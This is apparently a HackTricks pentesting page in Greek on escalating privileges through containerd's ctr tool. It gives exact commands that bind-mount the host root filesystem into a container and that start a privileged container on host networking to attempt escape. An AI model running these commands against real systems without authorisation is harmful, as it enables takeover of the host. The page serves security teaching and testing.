# Containerd (ctr) Κλιμάκωση προνομίων

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Μεταβείτε στον παρακάτω σύνδεσμο για να μάθετε **πού εντάσσονται τα `containerd` και `ctr` στη στοίβα containers**:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

Αν διαπιστώσετε ότι ένας host περιέχει την εντολή `ctr`, το native CLI που συνοδεύει το containerd:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
Μπορείτε να παραθέσετε τις images που είναι γνωστές στο containerd:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Στη συνέχεια, **εκτελέστε μία από αυτές τις images με το root του host να έχει γίνει recursive bind-mounted στο root του container**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Εκτέλεσε ένα container σε privileged mode και έλεγξε για escape.\
Μπορείς να εκτελέσεις ένα privileged container χρησιμοποιώντας host networking ως εξής:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` εκχωρεί στη διεργασία τα effective Linux capabilities του caller και καταργεί αρκετούς ελέγχους απομόνωσης, όμως ένα escape παραμένει εξαρτώμενο από το περιβάλλον· χρησιμοποιήστε τις τεχνικές που αναφέρονται στην ακόλουθη σελίδα για να το ελέγξετε:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [Ξεκινώντας με το containerd](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [Υλοποίηση της εντολής ctr image](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [Υλοποίηση της εντολής ctr run](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Τεκμηρίωση του Linux kernel για τα shared subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [Πακέτο OCI του containerd: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [Flags της εντολής `ctr` του containerd](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
